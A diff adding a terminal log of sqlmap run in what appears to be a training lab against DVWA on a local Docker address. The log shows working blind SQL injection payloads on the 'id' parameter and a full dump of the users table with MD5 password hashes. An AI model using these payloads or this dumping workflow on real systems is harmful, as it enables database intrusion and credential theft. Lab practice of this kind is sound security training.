@@ -1,0 +1,281 @@
+sekira@fedora:~/Projects/lab_04/sqlmap-dev$ python sqlmap.py --cookie='PHPSESSID=deu867jli8go3kps5qubne0hm3; security=low' -u "http://172.17.0.2/vulnerabilities/sqli_blind/?id=1&Submit=Submit"  --risk=2 -T users --dump
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.8.12#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:49:37 /2024-12-07/
+
+[14:49:37] [INFO] testing connection to the target URL
+[14:49:37] [INFO] testing if the target URL content is stable
+[14:49:38] [INFO] target URL content is stable
+[14:49:38] [INFO] testing if GET parameter 'id' is dynamic
+[14:49:38] [WARNING] GET parameter 'id' does not appear to be dynamic
+[14:49:38] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[14:49:38] [INFO] testing for SQL injection on GET parameter 'id'
+[14:49:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:49:38] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
+[14:49:38] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (2) values? [Y/n] y
+[14:49:43] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[14:49:43] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[14:49:43] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[14:49:43] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[14:49:43] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[14:49:43] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[14:49:43] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[14:49:43] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[14:49:43] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[14:49:43] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[14:49:43] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[14:49:43] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[14:49:43] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[14:49:43] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[14:49:43] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[14:49:43] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[14:49:43] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[14:49:43] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[14:49:43] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[14:49:43] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[14:49:43] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[14:49:43] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[14:49:43] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[14:49:43] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[14:49:43] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[14:49:43] [INFO] testing 'Generic inline queries'
+[14:49:43] [INFO] testing 'MySQL inline queries'
+[14:49:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[14:49:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[14:49:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[14:49:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[14:49:43] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[14:49:43] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[14:49:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[14:49:53] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[14:49:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[14:49:53] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[14:49:53] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[14:49:53] [INFO] target URL appears to have 2 columns in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
+[14:49:56] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[14:49:56] [INFO] target URL appears to be UNION injectable with 2 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
+[14:49:57] [INFO] testing 'MySQL UNION query (97) - 1 to 20 columns'
+[14:49:57] [INFO] testing 'MySQL UNION query (97) - 21 to 40 columns'
+[14:49:57] [INFO] testing 'MySQL UNION query (97) - 41 to 60 columns'
+[14:49:58] [INFO] testing 'MySQL UNION query (97) - 61 to 80 columns'
+[14:49:58] [INFO] testing 'MySQL UNION query (97) - 81 to 100 columns'
+[14:49:58] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+[14:49:59] [INFO] testing if GET parameter 'Submit' is dynamic
+[14:49:59] [WARNING] GET parameter 'Submit' does not appear to be dynamic
+[14:49:59] [WARNING] heuristic (basic) test shows that GET parameter 'Submit' might not be injectable
+[14:49:59] [INFO] testing for SQL injection on GET parameter 'Submit'
+[14:49:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:49:59] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[14:49:59] [INFO] testing 'Generic inline queries'
+[14:49:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[14:50:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[14:50:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[14:50:01] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[14:50:01] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[14:50:02] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[14:50:03] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[14:50:04] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[14:50:05] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[14:50:05] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[14:50:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
+[14:50:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
+[14:50:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
+[14:50:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
+[14:50:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
+[14:50:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
+[14:50:06] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[14:50:06] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[14:50:06] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[14:50:06] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[14:50:06] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
+[14:50:07] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
+[14:50:07] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[14:50:07] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[14:50:08] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[14:50:08] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[14:50:09] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[14:50:09] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[14:50:09] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[14:50:10] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[14:50:10] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[14:50:11] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[14:50:11] [INFO] testing 'MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[14:50:11] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[14:50:12] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[14:50:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[14:50:12] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[14:50:13] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[14:50:13] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[14:50:14] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[14:50:14] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[14:50:14] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[14:50:14] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[14:50:14] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[14:50:14] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[14:50:14] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[14:50:14] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[14:50:14] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[14:50:14] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
+[14:50:14] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
+[14:50:14] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
+[14:50:14] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
+[14:50:14] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[14:50:14] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
+[14:50:14] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
+[14:50:14] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[14:50:14] [INFO] testing 'MySQL inline queries'
+[14:50:14] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[14:50:14] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[14:50:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[14:50:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[14:50:15] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[14:50:15] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[14:50:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[14:50:16] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[14:50:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[14:50:17] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[14:50:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[14:50:18] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+[14:50:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[14:50:18] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
+[14:50:18] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[14:50:19] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[14:50:19] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
+[14:50:19] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
+[14:50:20] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
+[14:50:20] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
+[14:50:20] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
+[14:50:21] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
+[14:50:21] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[14:50:21] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
+[14:50:22] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[14:50:22] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
+[14:50:22] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[14:50:23] [INFO] testing 'MySQL OR time-based blind (ELT)'
+[14:50:23] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
+[14:50:23] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
+[14:50:23] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[14:50:24] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[14:50:24] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[14:50:24] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
+[14:50:24] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
+[14:50:24] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
+[14:50:24] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
+[14:50:24] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
+[14:50:24] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
+[14:50:24] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
+[14:50:24] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
+[14:50:25] [INFO] testing 'Generic UNION query (97) - 1 to 10 columns'
+[14:50:26] [INFO] testing 'MySQL UNION query (97) - 1 to 10 columns'
+[14:50:29] [WARNING] GET parameter 'Submit' does not seem to be injectable
+sqlmap identified the following injection point(s) with a total of 3988 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 5268=5268 AND 'KmEa'='KmEa&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 4233 FROM (SELECT(SLEEP(5)))EGim) AND 'raHH'='raHH&Submit=Submit
+---
+[14:50:29] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[14:50:29] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[14:50:29] [INFO] fetching current database
+[14:50:29] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[14:50:29] [INFO] retrieved: dvwa
+[14:50:29] [INFO] fetching columns for table 'users' in database 'dvwa'
+[14:50:29] [INFO] retrieved: 8
+[14:50:29] [INFO] retrieved: user_id
+[14:50:29] [INFO] retrieved: first_name
+[14:50:30] [INFO] retrieved: last_name
+[14:50:30] [INFO] retrieved: user
+[14:50:31] [INFO] retrieved: password
+[14:50:31] [INFO] retrieved: avatar
+[14:50:31] [INFO] retrieved: last_login
+[14:50:32] [INFO] retrieved: failed_login
+[14:50:33] [INFO] fetching entries for table 'users' in database 'dvwa'
+[14:50:33] [INFO] fetching number of entries for table 'users' in database 'dvwa'
+[14:50:33] [INFO] retrieved: 5
+[14:50:33] [INFO] retrieved: 1337
+[14:50:33] [INFO] retrieved: /hackable/users/1337.jpg
+[14:50:34] [INFO] retrieved: 0
+[14:50:34] [INFO] retrieved: Hack
+[14:50:34] [INFO] retrieved: 2024-12-07 08:20:54
+[14:50:35] [INFO] retrieved: Me
+[14:50:35] [INFO] retrieved: 8d3533d75ae2c3966d7e0d4fcc69216b
+[14:50:37] [INFO] retrieved: 3
+[14:50:37] [INFO] retrieved: admin
+[14:50:37] [INFO] retrieved: /hackable/users/admin.jpg
+[14:50:39] [INFO] retrieved: 0
+[14:50:39] [INFO] retrieved: admin
+[14:50:39] [INFO] retrieved: 2024-12-07 08:20:54
+[14:50:40] [INFO] retrieved: admin
+[14:50:40] [INFO] retrieved: 5f4dcc3b5aa765d61d8327deb882cf99
+[14:50:42] [INFO] retrieved: 1
+[14:50:42] [INFO] retrieved: gordonb
+[14:50:42] [INFO] retrieved: /hackable/users/gordonb.jpg
+[14:50:43] [INFO] retrieved: 0
+[14:50:43] [INFO] retrieved: Gordon
+[14:50:44] [INFO] retrieved: 2024-12-07 08:20:54
+[14:50:45] [INFO] retrieved: Brown
+[14:50:45] [INFO] retrieved: e99a18c428cb38d5f260853678922e03
+[14:50:47] [INFO] retrieved: 2
+[14:50:47] [INFO] retrieved: pablo
+[14:50:47] [INFO] retrieved: /hackable/users/pablo.jpg
+[14:50:48] [INFO] retrieved: 0
+[14:50:48] [INFO] retrieved: Pablo
+[14:50:49] [INFO] retrieved: 2024-12-07 08:20:54
+[14:50:50] [INFO] retrieved: Picasso
+[14:50:50] [INFO] retrieved: 0d107d09f5bbe40cade3de5c71e9e9b7
+[14:50:52] [INFO] retrieved: 4
+[14:50:52] [INFO] retrieved: smithy
+[14:50:52] [INFO] retrieved: /hackable/users/smithy.jpg
+[14:50:53] [INFO] retrieved: 0
+[14:50:53] [INFO] retrieved: Bob
+[14:50:53] [INFO] retrieved: 2024-12-07 08:20:54
+[14:50:54] [INFO] retrieved: Smith
+[14:50:55] [INFO] retrieved: 5f4dcc3b5aa765d61d8327deb882cf99
+[14:50:56] [INFO] retrieved: 5
+[14:50:56] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[14:50:58] [INFO] writing hashes to a temporary file '/tmp/sqlmapt9vepb5519891/sqlmaphashes-cl9_0uin.txt' 
+do you want to crack them via a dictionary-based attack? [Y/n/q] n
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       | 2024-12-07 08:20:54 | 0            |
+| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      | 2024-12-07 08:20:54 | 0            |
+| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     | 2024-12-07 08:20:54 | 0            |
+| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      | 2024-12-07 08:20:54 | 0            |
+| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        | 2024-12-07 08:20:54 | 0            |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+
+[14:51:03] [INFO] table 'dvwa.users' dumped to CSV file '/home/sekira/.local/share/sqlmap/output/172.17.0.2/dump/dvwa/users.csv'
+[14:51:03] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 2222 times
+[14:51:03] [INFO] fetched data logged to text files under '/home/sekira/.local/share/sqlmap/output/172.17.0.2'
+
+[*] ending @ 14:51:03 /2024-12-07/
+
+
